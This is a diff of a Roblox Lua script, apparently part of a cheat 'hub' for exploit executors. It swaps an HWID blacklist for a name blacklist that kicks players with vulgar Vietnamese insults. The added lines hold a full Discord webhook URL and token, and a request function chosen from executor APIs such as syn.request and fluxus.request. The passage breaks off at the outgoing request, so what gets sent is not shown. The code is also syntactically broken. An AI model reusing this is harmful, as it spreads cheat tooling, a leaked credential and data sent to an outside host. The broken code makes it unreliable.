@@ -1,46 +1,21 @@
--- Danh sách các HWID bị blacklist
-local blacklistHWIDs = {
-    "4f338e21-89f5-4c9c-97a2-f76af3af264a",
-    "HWID2",
-    "HWID3"
-}
+local blacklists = {"Proteinakako", "Name2"} --Put the name of the person you want to blacklist here.
 
--- Lấy HWID của người dùng hiện tại
-local currentHWID = ""
-
--- Kiểm tra nếu HWID của người dùng nằm trong danh sách đen
-local isBlacklisted = false
-for _, hwid in ipairs(blacklistHWIDs) do
-    if hwid == currentHWID then
-        isBlacklisted = true
-        break
-    end
+function findblacklist(plr) -- Function to find if they are blacklisted.
+	for _,v in pairs(blacklists) do -- Indexes the blacklists table above.
+		if plr.Name == v then -- Looks to see if their name is in the table.
+			return true
+		end
+	end
 end
 
--- Thực hiện hành động nếu HWID bị blacklist
-if isBlacklisted then
-    plr:Kick("bú hub con cặc bú cặc t này.")
-end
+game.Players.PlayerAdded:Connect(function(plr)
+	local isblacklisted = findblacklist(plr) -- Identifies if the player who joined is blacklisted.
+	
+	if isblacklisted then -- What you do here will effect blacklisted players.
+		plr:Kick("bú hun con cak") -- Kick and kick message.
+	end
 end)
-local blacklist = {"7040335561"}
-local bln = {"Proteinakako"}
-local function isCurrentPlayerBanned()
-    local playerId = game.Players.LocalPlayer.UserId
-    local playerName = game.Players.LocalPlayer.Name
-    for _, bannedId in ipairs(blacklist) do
-        if tostring(playerId) == bannedId then
-        plr:Kick("bú hub con cặc bú cặc t này.")
-        end
-    end
-    for _, bannedName in ipairs(bln) do
-        if playerName == bannedName then
-            return false
-        end
-    end
-    return true
-end
-if isCurrentPlayerBanned() then
-   local HttpService = game:GetService("HttpService")
+ local HttpService = game:GetService("HttpService")
 Webhook_URL =  "https://discord.com/api/webhooks/1269190578382442568/hch7wx8WtOLz5PRTa7JcCPIOiTozSsRJ05E84G2S6Qwr0USGmOBbCzZqMaEIy7D00YCL"
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 httprequest(
